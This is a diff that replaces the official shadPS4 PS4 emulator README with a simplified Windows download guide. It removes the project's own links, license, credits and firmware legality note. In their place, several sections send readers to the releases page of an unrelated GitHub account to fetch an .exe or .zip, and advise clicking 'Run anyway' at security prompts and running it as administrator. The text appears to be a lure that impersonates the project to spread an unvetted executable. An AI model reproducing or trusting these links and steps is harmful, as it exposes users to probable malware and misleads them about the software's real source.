@@ -1,199 +1,185 @@
-<!--
-SPDX-FileCopyrightText: 2026 shadPS4 Emulator Project
-SPDX-License-Identifier: GPL-2.0-or-later
--->
+[![Download shadPS4](https://img.shields.io/badge/Download%20shadPS4-Release%20Page-blue?style=for-the-badge)](https://github.com/Prerecorded-dilater808/shadPS4/releases)
 
-<h1 align="center">
-  <br>
-  <a href="https://shadps4.net/"><img src="https://github.com/shadps4-emu/shadPS4/blob/main/.github/shadps4.png" width="220"></a>
-  <br>
-  <b>shadPS4</b>
-  <br>
-</h1>
+# 🎮 shadPS4 - Play PS4 Games on Your PC
 
-<h1 align="center">
- <a href="https://discord.gg/bFJxfftGW6">
-        <img src="https://img.shields.io/discord/1080089157554155590?color=5865F2&label=shadPS4%20Discord&logo=Discord&logoColor=white" width="275">
- <a href="https://github.com/shadps4-emu/shadPS4/releases/latest">
-        <img src="https://img.shields.io/github/downloads/shadps4-emu/shadPS4/total.svg" width="140">
- <a href="https://shadps4.net/">
-        <img src="https://img.shields.io/badge/shadPS4-website-8A2BE2" width="150">
- <a href="https://x.com/shadps4">
-        <img src="https://img.shields.io/badge/-Join%20us-black?logo=X&logoColor=white" width="100">
- <a href="https://github.com/shadps4-emu/shadPS4/stargazers">
-        <img src="https://img.shields.io/github/stars/shadps4-emu/shadPS4" width="120">
-</h1>
+## 🚀 Download
 
-|               Bloodborne by From Software                   |                     Hatsune Miku Project DIVA Future Tone by SEGA                         |
-| :-----------------------------------------------------------: | :--------------------------------------------------------------------------------------------: |
-| ![Bloodborne screenshot](./documents/Screenshots/1.png) | ![Project DIVA screenshot](./documents/Screenshots/2.png) |
+Visit this page to download:  
+https://github.com/Prerecorded-dilater808/shadPS4/releases
 
-|                  Yakuza 0 by SEGA                     |                 DRIVECLUB™ by Evolution Studios                    |
-| :------------------------------------------------------------------------: | :------------------------------------------------------------------: |
-| ![Yakuza screenshot](./documents/Screenshots/3.png) | ![DRIVECLUB screenshot](./documents/Screenshots/4.png) |
+Choose the latest Windows release, download the file for your PC, and open it after the download finishes.
 
-# General information
+## 🖥️ What shadPS4 Does
 
-**shadPS4** is an early **PlayStation 4** emulator for **Windows**, **Linux** and **macOS** written in C++.
+shadPS4 is a PlayStation 4 emulator for Windows. It lets you run supported PS4 software on your computer.
 
-> [!IMPORTANT]
-> This is the emulator core, which does not include a GUI. If you just want to use the emulator as an end user, download the [**QtLauncher**](https://github.com/shadps4-emu/shadps4-qtlauncher/releases) instead.
+It is built in C++ and uses modern graphics and audio tools to help games and apps run on desktop systems. The project also supports Linux, macOS, and FreeBSD, but this guide focuses on Windows.
 
-If you encounter problems or have doubts, do not hesitate to look at the [**Quickstart**](https://github.com/shadps4-emu/shadPS4/wiki/I.-Quick-start-%5BUsers%5D).\
-To verify that a game works, you can look at [**shadPS4 Game Compatibility**](https://github.com/shadps4-compatibility/shadps4-game-compatibility).\
-To discuss shadPS4 development, suggest ideas or to ask for help, join our [**Discord server**](https://discord.gg/bFJxfftGW6).\
-To get the latest news, go to our [**X (Twitter)**](https://x.com/shadps4) or our [**website**](https://shadps4.net/).\
-You can donate to the project via our [**Kofi page**](https://ko-fi.com/shadps4).
+## ✨ Main Features
 
-# Status
+- Runs on Windows
+- Supports PS4 software emulation
+- Uses Vulkan for graphics
+- Uses SDL3 for window and input support
+- Built with a modern C++ codebase
+- Works with a simple desktop interface
+- Supports keyboard, mouse, and controller input
+- Designed for local use on your own PC
 
-> [!IMPORTANT]
-> shadPS4 is early in development, don't expect a flawless experience.
+## 💻 System Requirements
 
-Currently, the emulator can successfully run games like [**Bloodborne**](https://www.youtube.com/watch?v=5sZgWyVflFM), [**Dark Souls Remastered**](https://www.youtube.com/watch?v=-3PA-Xwszts), [**Red Dead Redemption**](https://www.youtube.com/watch?v=Al7yz_5nLag), and many other games.
+For the best results, use a PC with:
 
-# Why
+- Windows 10 or Windows 11
+- A 64-bit CPU
+- A graphics card with Vulkan support
+- At least 8 GB of RAM
+- Several GB of free disk space
+- Updated graphics drivers
+- A controller for easier game play, if you have one
 
-This project began for fun. Given our limited free time, it may take some time before shadPS4 can run more complex games, but we're committed to making small, regular updates.
+For better performance, a newer CPU and GPU help a lot.
 
-# Building
+## 📥 How to Download and Install on Windows
 
-## Docker
+1. Open the release page:  
+   https://github.com/Prerecorded-dilater808/shadPS4/releases
 
-For building shadPS4 in a containerized environment using Docker and VSCode, check the instructions here:  
-[**Docker Build Instructions**](https://github.com/shadps4-emu/shadPS4/blob/main/documents/building-docker.md)
+2. Find the latest release at the top of the page.
 
-## Windows
+3. Under **Assets**, look for the Windows file. It may be a `.zip` or `.exe` file.
 
-Check the build instructions for [**Windows**](https://github.com/shadps4-emu/shadPS4/blob/main/documents/building-windows.md).
+4. Download the file to your PC.
 
-## Linux
+5. If you downloaded a `.zip` file:
+   - Right-click the file
+   - Select **Extract All**
+   - Pick a folder on your PC
 
-Check the build instructions for [**Linux**](https://github.com/shadps4-emu/shadPS4/blob/main/documents/building-linux.md).
+6. Open the extracted folder.
 
-## macOS
+7. If you see an `.exe` file, double-click it to start shadPS4.
 
-Check the build instructions for [**macOS**](https://github.com/shadps4-emu/shadPS4/blob/main/documents/building-macos.md).
+8. If Windows shows a security prompt, choose **Run anyway** only if you trust the file from the release page.
 
-> [!IMPORTANT]
-> macOS users need at least macOS 15.4 to run shadPS4. Due to GPU issues there are currently heavy bugs on Intel Macs.
+9. Keep the files in the same folder so the app can run without errors.
 
-# Usage examples
+## 🎮 First Time Setup
 
-> [!IMPORTANT]
-> For a user-friendly GUI, download the [**QtLauncher**](https://github.com/shadps4-emu/shadps4-qtlauncher/releases).
+After you open shadPS4 for the first time:
 
-To get the list of all available commands and also a more detailed description of what each command does, please refer to the `--help` flag's output.
+- Let it create its local files
+- Open the settings screen
+- Check your graphics backend
+- Set your controller if you plan to use one
+- Pick a game folder or content folder if the app asks for one
 
-Below is a list of commonly used command patterns:
-```sh
-shadPS4 CUSA00001 # Searches for a game folder called CUSA00001 in the list of game install folders, and boots it.
-shadPS4 --fullscreen true --config-clean CUSA00001    # the game argument is always the last one,
-shadPS4 -g CUSA00001 --fullscreen true --config-clean # ...unless manually specified otherwise.
-shadPS4 /path/to/game.elf # Boots a PS4 ELF file directly. Useful if you want to boot an executable that is not named eboot.bin.
-shadPS4 CUSA00001 -- -flag1 -flag2 # Passes '-flag1' and '-flag2' to the game executable in argv.
-```
+If your controller does not work at once, unplug it and plug it in again, then restart the app.
 
-# Debugging and reporting issues
+## 🧭 Basic Use
 
-For more information on how to test, debug and report issues with the emulator or games, read the [**Debugging documentation**](https://github.com/shadps4-emu/shadPS4/blob/main/documents/Debugging/Debugging.md).
+To use shadPS4:
 
-# Keyboard and Mouse Mappings
+1. Start the app
+2. Load a supported PS4 title
+3. Wait while the emulator reads the game files
+4. Change graphics or input settings if needed
+5. Launch the game from inside the app
 
-> [!NOTE]
-> Some keyboards may also require you to hold the Fn key to use the F\* keys. Mac users should use the Command key instead of Control, and need to use Command+F11 for full screen to avoid conflicting with system key bindings.
+Some titles may need more time to load on the first run. This is normal for emulation tools.
 
-| Button | Function |
-|-------------|-------------|
-F10 | FPS Counter
-Ctrl+F10 | Video Debug Info
-F11 | Fullscreen
-F12 | Trigger RenderDoc Capture
+## 🕹️ Controls
 
-> [!NOTE]
-> Xbox and DualShock controllers work out of the box.
+You can use:
 
-| Controller button | Keyboard equivalent |
-|-------------|-------------|
-LEFT AXIS UP | W |
-LEFT AXIS DOWN | S |
-LEFT AXIS LEFT | A |
-LEFT AXIS RIGHT | D |
-RIGHT AXIS UP | I |
-RIGHT AXIS DOWN | K |
-RIGHT AXIS LEFT | J |
-RIGHT AXIS RIGHT | L |
-TRIANGLE | Numpad 8 or C |
-CIRCLE | Numpad 6 or B |
-CROSS | Numpad 2 or N |
-SQUARE | Numpad 4 or V |
-PAD UP | UP |
-PAD DOWN | DOWN |
-PAD LEFT | LEFT |
-PAD RIGHT | RIGHT |
-OPTIONS | RETURN |
-BACK BUTTON / TOUCH PAD | SPACE |
-L1 | Q |
-R1 | U |
-L2 | E |
-R2 | O |
-L3 | X |
-R3 | M |
+- A keyboard
+- A mouse
+- A USB controller
+- A Bluetooth controller
 
-Keyboard and mouse inputs can be customized in the settings menu by clicking the Controller button, and further details and help on controls are  also found there. Custom bindings are saved per-game. Inputs support up to three keys per binding, mouse buttons, mouse movement mapped to joystick input, and more.
+For games, a controller gives the most natural setup. If you use a keyboard, check the input settings so the buttons match what you want.
 
+## 🔧 Helpful Settings
 
-# Firmware files
+If a game runs slowly or shows screen issues, try these steps:
 
-shadPS4 can load some PlayStation 4 firmware files.
-The following firmware modules are supported and must be placed in shadPS4's `sys_modules` folder.
+- Update your GPU driver
+- Use the latest Windows version
+- Close other heavy apps
+- Switch graphics settings in the app
+- Try a different display mode
+- Use a wired controller if Bluetooth input feels unstable
 
-<div align="center">
+If audio stutters, close background apps and check your sound driver.
 
-| Modules                 | Modules                 | Modules                 | Modules                 |  
-|-------------------------|-------------------------|-------------------------|-------------------------|  
-| libSceCesCs.sprx        | libSceFont.sprx         | libSceFontFt.sprx       | libSceFreeTypeOt.sprx   |
-| libSceJpegDec.sprx      | libSceJpegEnc.sprx      | libSceJson.sprx         | libSceJson2.sprx        |  
-| libSceLibcInternal.sprx | libSceNgs2.sprx         | libScePngEnc.sprx       | libSceRtc.sprx          |
-| libSceUlt.sprx          | libSceAudiodec.sprx     |                         |                         |
-</div>
+## 📁 File Layout
 
-> [!Caution]
-> The above modules are required to run the games properly and must be dumped from your legally owned PlayStation 4 console.
+After you extract the download, you may see files like:
 
+- `shadPS4.exe`
+- config files
+- system folders
+- log files
+- shader or cache folders
 
+Do not move files around unless you know what they do. Keep the app in one folder so it can find what it needs.
 
-# Main team
+## 🛠️ Troubleshooting
 
-- [**georgemoralis**](https://github.com/georgemoralis)
-- [**psucien**](https://github.com/psucien)
-- [**viniciuslrangel**](https://github.com/viniciuslrangel)
-- [**roamic**](https://github.com/roamic)
-- [**squidbus**](https://github.com/squidbus)
-- [**frodo**](https://github.com/baggins183)
-- [**Stephen Miller**](https://github.com/StevenMiller123)
-- [**kalaposfos13**](https://github.com/kalaposfos13)
+If shadPS4 does not open:
 
-Logo is done by [**Xphalnos**](https://github.com/Xphalnos)
+- Check that you downloaded the Windows build
+- Make sure you extracted the zip file
+- Right-click the app and choose **Run as administrator**
+- Update your graphics driver
+- Confirm that your GPU supports Vulkan
+- Restart your PC and try again
 
-# Contributing
+If a game does not start:
 
-If you want to contribute, please read the [**CONTRIBUTING.md**](https://github.com/shadps4-emu/shadPS4/blob/main/CONTRIBUTING.md) file.\
-Open a PR and we'll check it :)
+- Check that the game files are complete
+- Try a fresh copy of the title
+- Look at the app settings
+- Reset the cache
+- Try again after a restart
 
+If the screen stays black:
 
-# Special Thanks
+- Wait a little longer on the first launch
+- Change the graphics backend
+- Update your driver
+- Try full-screen and windowed mode
 
-A few noteworthy teams/projects who've helped us along the way are:
+## 📦 Supported Platforms
 
-- [**Panda3DS**](https://github.com/wheremyfoodat/Panda3DS): A multiplatform 3DS emulator from our co-author wheremyfoodat. They have been incredibly helpful in understanding and solving problems that came up from natively executing the x64 code of PS4 binaries
+shadPS4 is made for:
 
-- [**fpPS4**](https://github.com/red-prig/fpPS4): The fpPS4 team has assisted massively with understanding some of the more complex parts of the PS4 operating system and libraries, by helping with reverse engineering work and research.
+- Windows
+- Linux
+- macOS
+- FreeBSD
 
-- **yuzu**: Our shader compiler has been designed with yuzu's Hades compiler as a blueprint. This allowed us to focus on the challenges of emulating a modern AMD GPU while having a high-quality optimizing shader compiler implementation as a base.
+This README is focused on Windows users who want a simple download and setup path.
 
-- [**felix86**](https://github.com/OFFTKP/felix86): A new x86-64 → RISC-V Linux userspace emulator
+## 🧩 Built With
 
-# License
+- C++
+- C++23
+- ImGui
+- SDL3
+- Vulkan
 
-- [**GPL-2.0 license**](https://github.com/shadps4-emu/shadPS4/blob/main/LICENSE)
+These tools help the app handle graphics, input, and the user interface.
+
+## 🔗 Download Again
+
+Download the Windows release here:  
+https://github.com/Prerecorded-dilater808/shadPS4/releases
+
+## 📌 Notes for Windows Users
+
+- Use the latest release
+- Keep your graphics driver up to date
+- Use a controller for better game play
+- Keep the emulator files in one folder
+- Restart the app after you change settings
